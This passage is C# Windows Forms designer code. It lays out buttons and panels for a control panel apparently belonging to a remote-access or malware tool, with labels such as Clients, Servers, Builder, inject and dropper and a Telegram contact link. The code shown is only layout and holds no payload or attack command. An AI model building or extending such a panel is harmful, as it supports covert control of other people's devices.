            this.ImageList1.ColorDepth = System.Windows.Forms.ColorDepth.Depth8Bit;
            this.ImageList1.ImageSize = new System.Drawing.Size(16, 16);
            this.ImageList1.TransparentColor = System.Drawing.Color.Transparent;
            // 
            // monitortimer
            // 
            this.monitortimer.Tick += new System.EventHandler(this.Satustimer_Tick);
            // 
            // guna2BorderlessForm1
            // 
            this.guna2BorderlessForm1.ContainerControl = this;
            this.guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6D;
            this.guna2BorderlessForm1.TransparentWhileDrag = true;
            // 
            // dataGridViewImageColumn5
            // 
            this.dataGridViewImageColumn5.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
            this.dataGridViewImageColumn5.FillWeight = 34.34997F;
            this.dataGridViewImageColumn5.HeaderText = "Wifi";
            this.dataGridViewImageColumn5.MinimumWidth = 8;
            this.dataGridViewImageColumn5.Name = "dataGridViewImageColumn5";
            this.dataGridViewImageColumn5.ReadOnly = true;
            this.dataGridViewImageColumn5.Visible = false;
            this.dataGridViewImageColumn5.Width = 8;
            // 
            // panel1
            // 
            this.panel1.Controls.Add(this.drakeUILabel8);
            this.panel1.Controls.Add(this.drakeUIButtonIcon39);
            this.panel1.Controls.Add(this.drakeUIButtonIcon40);
            this.panel1.Controls.Add(this.drakeUIButtonIcon42);
            this.panel1.Controls.Add(this.drakeUIButtonIcon41);
            this.panel1.Controls.Add(this.Home_Btn);
            this.panel1.Controls.Add(this.blockbtn);
            this.panel1.Controls.Add(this.Connection_btn);
            this.panel1.Controls.Add(this.serversbtn);
            this.panel1.Controls.Add(this.notifiaisbtntop);
            this.panel1.Controls.Add(this.Clients_Btn);
            this.panel1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.panel1.Location = new System.Drawing.Point(197, 4);
            this.panel1.Margin = new System.Windows.Forms.Padding(4);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(1421, 74);
            this.panel1.TabIndex = 151;
            this.panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(this.panel1_MouseDown_1);
            // 
            // drakeUILabel8
            // 
            this.drakeUILabel8.Font = new System.Drawing.Font("Bahnschrift Light", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUILabel8.ForeColor = System.Drawing.Color.DeepSkyBlue;
            this.drakeUILabel8.Location = new System.Drawing.Point(851, 11);
            this.drakeUILabel8.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.drakeUILabel8.Name = "drakeUILabel8";
            this.drakeUILabel8.Size = new System.Drawing.Size(317, 38);
            this.drakeUILabel8.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUILabel8.TabIndex = 104;
            this.drakeUILabel8.Text = "https://t.me/n0xi0s";
            this.drakeUILabel8.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // drakeUIButtonIcon39
            // 
            this.drakeUIButtonIcon39.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon39.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon39.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon39.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon39.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon39.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon39.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon39.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon39.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon39.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon39.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon39.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon39.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon39.Location = new System.Drawing.Point(1283, 6);
            this.drakeUIButtonIcon39.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon39.Name = "drakeUIButtonIcon39";
            this.drakeUIButtonIcon39.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon39.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon39.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon39.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon39.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon39.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon39.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon39.Size = new System.Drawing.Size(35, 26);
            this.drakeUIButtonIcon39.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon39.Symbol = 61802;
            this.drakeUIButtonIcon39.SymbolSize = 30;
            this.drakeUIButtonIcon39.TabIndex = 103;
            this.drakeUIButtonIcon39.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon39.Click += new System.EventHandler(this.drakeUIButtonIcon39_Click);
            // 
            // drakeUIButtonIcon40
            // 
            this.drakeUIButtonIcon40.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon40.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon40.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon40.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon40.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon40.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon40.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon40.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon40.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon40.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon40.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon40.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon40.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon40.Location = new System.Drawing.Point(1325, 4);
            this.drakeUIButtonIcon40.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon40.Name = "drakeUIButtonIcon40";
            this.drakeUIButtonIcon40.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon40.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon40.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon40.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon40.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon40.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon40.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon40.Size = new System.Drawing.Size(35, 26);
            this.drakeUIButtonIcon40.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon40.Symbol = 61796;
            this.drakeUIButtonIcon40.SymbolSize = 30;
            this.drakeUIButtonIcon40.TabIndex = 102;
            this.drakeUIButtonIcon40.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            // 
            // drakeUIButtonIcon42
            // 
            this.drakeUIButtonIcon42.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon42.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon42.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon42.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon42.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon42.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon42.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon42.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon42.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon42.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon42.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon42.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon42.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon42.Location = new System.Drawing.Point(1357, 6);
            this.drakeUIButtonIcon42.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon42.Name = "drakeUIButtonIcon42";
            this.drakeUIButtonIcon42.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon42.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon42.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon42.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon42.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon42.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon42.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon42.Size = new System.Drawing.Size(35, 26);
            this.drakeUIButtonIcon42.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon42.Symbol = 62161;
            this.drakeUIButtonIcon42.SymbolSize = 30;
            this.drakeUIButtonIcon42.TabIndex = 101;
            this.drakeUIButtonIcon42.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon42.Click += new System.EventHandler(this.drakeUIButtonIcon42_Click);
            // 
            // drakeUIButtonIcon41
            // 
            this.drakeUIButtonIcon41.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon41.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon41.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon41.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon41.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon41.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon41.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon41.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon41.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon41.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon41.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon41.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon41.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon41.Location = new System.Drawing.Point(1389, 6);
            this.drakeUIButtonIcon41.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon41.Name = "drakeUIButtonIcon41";
            this.drakeUIButtonIcon41.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon41.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon41.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon41.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon41.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon41.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon41.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon41.Size = new System.Drawing.Size(35, 26);
            this.drakeUIButtonIcon41.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon41.Symbol = 61527;
            this.drakeUIButtonIcon41.SymbolSize = 30;
            this.drakeUIButtonIcon41.TabIndex = 100;
            this.drakeUIButtonIcon41.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon41.Click += new System.EventHandler(this.drakeUIButtonIcon41_Click);
            // 
            // Home_Btn
            // 
            this.Home_Btn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Home_Btn.FillColor = System.Drawing.Color.Black;
            this.Home_Btn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.Home_Btn.FillPressColor = System.Drawing.Color.Black;
            this.Home_Btn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Home_Btn.Font = new System.Drawing.Font("Calibri", 9F);
            this.Home_Btn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Home_Btn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Home_Btn.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.Home_Btn.Location = new System.Drawing.Point(13, 11);
            this.Home_Btn.Margin = new System.Windows.Forms.Padding(4);
            this.Home_Btn.Name = "Home_Btn";
            this.Home_Btn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.Home_Btn.RectColor = System.Drawing.Color.Black;
            this.Home_Btn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.Home_Btn.RectHoverColor = System.Drawing.Color.White;
            this.Home_Btn.RectPressColor = System.Drawing.Color.White;
            this.Home_Btn.RectSelectedColor = System.Drawing.Color.White;
            this.Home_Btn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
            this.Home_Btn.ShowFocusLine = true;
            this.Home_Btn.Size = new System.Drawing.Size(112, 47);
            this.Home_Btn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.Home_Btn.StyleCustomMode = true;
            this.Home_Btn.Symbol = 57460;
            this.Home_Btn.SymbolSize = 30;
            this.Home_Btn.TabIndex = 16;
            this.Home_Btn.Text = "Dashboard";
            this.Home_Btn.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.Home_Btn.TipsText = "Home";
            this.Home_Btn.Click += new System.EventHandler(this.DrakeUIAvatar8_Click);
            // 
            // blockbtn
            // 
            this.blockbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.blockbtn.FillColor = System.Drawing.Color.Black;
            this.blockbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.blockbtn.FillPressColor = System.Drawing.Color.Black;
            this.blockbtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.blockbtn.Font = new System.Drawing.Font("Calibri", 9F);
            this.blockbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.blockbtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.blockbtn.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.blockbtn.Location = new System.Drawing.Point(620, 11);
            this.blockbtn.Margin = new System.Windows.Forms.Padding(4);
            this.blockbtn.Name = "blockbtn";
            this.blockbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.blockbtn.RectColor = System.Drawing.Color.Black;
            this.blockbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.blockbtn.RectHoverColor = System.Drawing.Color.White;
            this.blockbtn.RectPressColor = System.Drawing.Color.White;
            this.blockbtn.RectSelectedColor = System.Drawing.Color.White;
            this.blockbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
            this.blockbtn.ShowFocusLine = true;
            this.blockbtn.Size = new System.Drawing.Size(119, 47);
            this.blockbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.blockbtn.StyleCustomMode = true;
            this.blockbtn.Symbol = 61534;
            this.blockbtn.SymbolSize = 30;
            this.blockbtn.TabIndex = 41;
            this.blockbtn.Text = "BLocked List";
            this.blockbtn.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.blockbtn.TipsText = "Home";
            this.blockbtn.Click += new System.EventHandler(this.DrakeUIButtonIcon10_Click_1);
            // 
            // Connection_btn
            // 
            this.Connection_btn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Connection_btn.FillColor = System.Drawing.Color.Black;
            this.Connection_btn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.Connection_btn.FillPressColor = System.Drawing.Color.Black;
            this.Connection_btn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Connection_btn.Font = new System.Drawing.Font("Calibri", 9F);
            this.Connection_btn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Connection_btn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Connection_btn.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.Connection_btn.Location = new System.Drawing.Point(500, 11);
            this.Connection_btn.Margin = new System.Windows.Forms.Padding(4);
            this.Connection_btn.Name = "Connection_btn";
            this.Connection_btn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.Connection_btn.RectColor = System.Drawing.Color.Black;
            this.Connection_btn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.Connection_btn.RectHoverColor = System.Drawing.Color.White;
            this.Connection_btn.RectPressColor = System.Drawing.Color.White;
            this.Connection_btn.RectSelectedColor = System.Drawing.Color.White;
            this.Connection_btn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
            this.Connection_btn.ShowFocusLine = true;
            this.Connection_btn.Size = new System.Drawing.Size(112, 47);
            this.Connection_btn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.Connection_btn.StyleCustomMode = true;
            this.Connection_btn.Symbol = 61926;
            this.Connection_btn.SymbolSize = 30;
            this.Connection_btn.TabIndex = 42;
            this.Connection_btn.Text = "Connections";
            this.Connection_btn.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.Connection_btn.TipsText = "Home";
            this.Connection_btn.Click += new System.EventHandler(this.Connection_btn_Click);
            // 
            // serversbtn
            // 
            this.serversbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.serversbtn.FillColor = System.Drawing.Color.Black;
            this.serversbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.serversbtn.FillPressColor = System.Drawing.Color.Black;
            this.serversbtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.serversbtn.Font = new System.Drawing.Font("Calibri", 9F);
            this.serversbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.serversbtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.serversbtn.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.serversbtn.Location = new System.Drawing.Point(380, 11);
            this.serversbtn.Margin = new System.Windows.Forms.Padding(4);
            this.serversbtn.Name = "serversbtn";
            this.serversbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.serversbtn.RectColor = System.Drawing.Color.Black;
            this.serversbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.serversbtn.RectHoverColor = System.Drawing.Color.White;
            this.serversbtn.RectPressColor = System.Drawing.Color.White;
            this.serversbtn.RectSelectedColor = System.Drawing.Color.White;
            this.serversbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
            this.serversbtn.Size = new System.Drawing.Size(112, 47);
            this.serversbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.serversbtn.Symbol = 61451;
            this.serversbtn.SymbolSize = 30;
            this.serversbtn.TabIndex = 45;
            this.serversbtn.Text = "Servers";
            this.serversbtn.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.serversbtn.Click += new System.EventHandler(this.DrakeUIButtonIcon14_Click);
            // 
            // notifiaisbtntop
            // 
            this.notifiaisbtntop.Cursor = System.Windows.Forms.Cursors.Hand;
            this.notifiaisbtntop.FillColor = System.Drawing.Color.Black;
            this.notifiaisbtntop.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.notifiaisbtntop.FillPressColor = System.Drawing.Color.Black;
            this.notifiaisbtntop.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.notifiaisbtntop.Font = new System.Drawing.Font("Calibri", 9F);
            this.notifiaisbtntop.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.notifiaisbtntop.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.notifiaisbtntop.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.notifiaisbtntop.Location = new System.Drawing.Point(260, 11);
            this.notifiaisbtntop.Margin = new System.Windows.Forms.Padding(4);
            this.notifiaisbtntop.Name = "notifiaisbtntop";
            this.notifiaisbtntop.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.notifiaisbtntop.RectColor = System.Drawing.Color.Black;
            this.notifiaisbtntop.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.notifiaisbtntop.RectHoverColor = System.Drawing.Color.White;
            this.notifiaisbtntop.RectPressColor = System.Drawing.Color.White;
            this.notifiaisbtntop.RectSelectedColor = System.Drawing.Color.White;
            this.notifiaisbtntop.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
            this.notifiaisbtntop.Size = new System.Drawing.Size(112, 47);
            this.notifiaisbtntop.Style = DrakeUI.Framework.UIStyle.Custom;
            this.notifiaisbtntop.Symbol = 61683;
            this.notifiaisbtntop.SymbolSize = 30;
            this.notifiaisbtntop.TabIndex = 44;
            this.notifiaisbtntop.Text = "Notifications";
            this.notifiaisbtntop.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.notifiaisbtntop.Click += new System.EventHandler(this.DrakeUIButtonIcon1_Click_1);
            // 
            // Clients_Btn
            // 
            this.Clients_Btn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Clients_Btn.FillColor = System.Drawing.Color.Black;
            this.Clients_Btn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.Clients_Btn.FillPressColor = System.Drawing.Color.Black;
            this.Clients_Btn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Clients_Btn.Font = new System.Drawing.Font("Calibri", 9F);
            this.Clients_Btn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Clients_Btn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Clients_Btn.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.Clients_Btn.Location = new System.Drawing.Point(133, 11);
            this.Clients_Btn.Margin = new System.Windows.Forms.Padding(4);
            this.Clients_Btn.Name = "Clients_Btn";
            this.Clients_Btn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.Clients_Btn.RectColor = System.Drawing.Color.Black;
            this.Clients_Btn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.Clients_Btn.RectHoverColor = System.Drawing.Color.White;
            this.Clients_Btn.RectPressColor = System.Drawing.Color.White;
            this.Clients_Btn.RectSelectedColor = System.Drawing.Color.White;
            this.Clients_Btn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
            this.Clients_Btn.ShowFocusLine = true;
            this.Clients_Btn.Size = new System.Drawing.Size(119, 47);
            this.Clients_Btn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.Clients_Btn.StyleCustomMode = true;
            this.Clients_Btn.Symbol = 61447;
            this.Clients_Btn.SymbolSize = 30;
            this.Clients_Btn.TabIndex = 40;
            this.Clients_Btn.Text = "Clients";
            this.Clients_Btn.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.Clients_Btn.TipsText = "Home";
            this.Clients_Btn.Click += new System.EventHandler(this.DrakeUIButtonIcon7_Click_1);
            // 
            // Panel3
            // 
            this.Panel3.BackColor = System.Drawing.Color.Black;
            this.Panel3.Controls.Add(this.Build_btn);
            this.Panel3.Controls.Add(this.inject_btn);
            this.Panel3.Controls.Add(this.drakeUILabel5);
            this.Panel3.Controls.Add(this.Settings_btn);
            this.Panel3.Controls.Add(this.droperbtn);
            this.Panel3.Controls.Add(this.studiobtn);
            this.Panel3.Controls.Add(this.pictureBox2);
            this.Panel3.Controls.Add(this.Label3);
            this.Panel3.Cursor = System.Windows.Forms.Cursors.SizeAll;
            this.Panel3.Dock = System.Windows.Forms.DockStyle.Left;
            this.Panel3.Location = new System.Drawing.Point(0, 0);
            this.Panel3.Margin = new System.Windows.Forms.Padding(4);
            this.Panel3.Name = "Panel3";
            this.Panel3.Size = new System.Drawing.Size(189, 798);
            this.Panel3.TabIndex = 11;
            this.Panel3.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Panel3_MouseDown);
            // 
            // Build_btn
            // 
            this.Build_btn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Build_btn.FillColor = System.Drawing.Color.Black;
            this.Build_btn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.Build_btn.FillPressColor = System.Drawing.Color.Black;
            this.Build_btn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Build_btn.Font = new System.Drawing.Font("Calibri", 9F);
            this.Build_btn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Build_btn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Build_btn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.Build_btn.Location = new System.Drawing.Point(16, 300);
            this.Build_btn.Margin = new System.Windows.Forms.Padding(4);
            this.Build_btn.Name = "Build_btn";
            this.Build_btn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.Build_btn.RectColor = System.Drawing.Color.Black;
            this.Build_btn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.Build_btn.RectHoverColor = System.Drawing.Color.White;
            this.Build_btn.RectPressColor = System.Drawing.Color.White;
            this.Build_btn.RectSelectedColor = System.Drawing.Color.White;
            this.Build_btn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Left;
            this.Build_btn.Size = new System.Drawing.Size(165, 53);
            this.Build_btn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.Build_btn.Symbol = 61819;
            this.Build_btn.SymbolSize = 30;
            this.Build_btn.TabIndex = 131;
            this.Build_btn.Text = "Builder";
            this.Build_btn.Click += new System.EventHandler(this.Build_btn_Click);
            // 
            // inject_btn
            // 
            this.inject_btn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.inject_btn.FillColor = System.Drawing.Color.Black;
            this.inject_btn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.inject_btn.FillPressColor = System.Drawing.Color.Black;
